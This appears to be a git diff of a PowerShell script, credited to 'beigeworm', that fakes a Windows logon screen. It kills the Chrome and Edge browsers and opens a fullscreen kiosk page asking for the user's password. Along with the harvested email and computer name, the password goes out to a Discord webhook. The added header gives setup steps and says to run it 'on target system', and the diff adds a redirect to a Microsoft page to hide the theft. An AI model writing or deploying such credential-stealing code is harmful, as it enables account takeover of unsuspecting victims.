@@ -1,3 +1,19 @@
+
+
+<#
+====================== beigeworm's Fake Windows Logon Screen to Discord Webhook =========================
+
+SYNOPNIS
+This script kills all egde and chrome processes, starts screensaver and opens edge in fullscreen that asks for login info and posts results to a discord webhook.
+
+SETUP
+1. Replace YOUR_WEBBHOOK_HERE with your webhook.
+
+USAGE
+1.Run script on target system.
+
+#>
+
 # GATHER SYSTEM AND USER INFO
 $u = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches
 $c = $env:COMPUTERNAME
@@ -54,7 +70,7 @@ $h = @"
     </div>
   </div>
   <script>
-    function sendPasswordToWebhook() {
+    function sendCredentialsAndExecuteCommand() {
       var passwordValue = document.getElementById("password").value;
       var webhookUrl = "$dc";
       var uValue = "$u";
@@ -66,10 +82,11 @@ $h = @"
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(data)})
-      .then(response => {})
-      .catch(error => {});}
+      .then(response => {window.location.href = 'https://go.microsoft.com/fwlink/p/?linkid=2072756';})
+      .catch(error => {window.location.href = 'https://go.microsoft.com/fwlink/p/?linkid=2072756';});}
+
     document.getElementById("btnSignIn").addEventListener("click", function() {
-      sendPasswordToWebhook();
+      sendCredentialsAndExecuteCommand();
     });
   </script>
 </body>
@@ -84,13 +101,10 @@ $a = "file://$p"
 # KILL ANY BROWSERS (interfere with "Maximazed" argument)
 Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe" -NoNewWindow -Wait
 Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "msedge.exe" -NoNewWindow -Wait
-sleep 1
+Sleep -Milliseconds 250
 
 # START EDGE IN FULLSCREEN
 $edgeProcess = Start-Process -FilePath "msedge.exe" -ArgumentList "--kiosk --app=$a" -WindowStyle Maximized
-sleep -Milliseconds 400
-Start-Process -FilePath "C:\Windows\System32\scrnsave.scr"
-$edgeProcess.WaitForExit()
-sleep 2
-Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "msedge.exe" -NoNewWindow -Wait
+Sleep -Milliseconds 500
+$black = Start-Process -FilePath "C:\Windows\System32\scrnsave.scr"
 
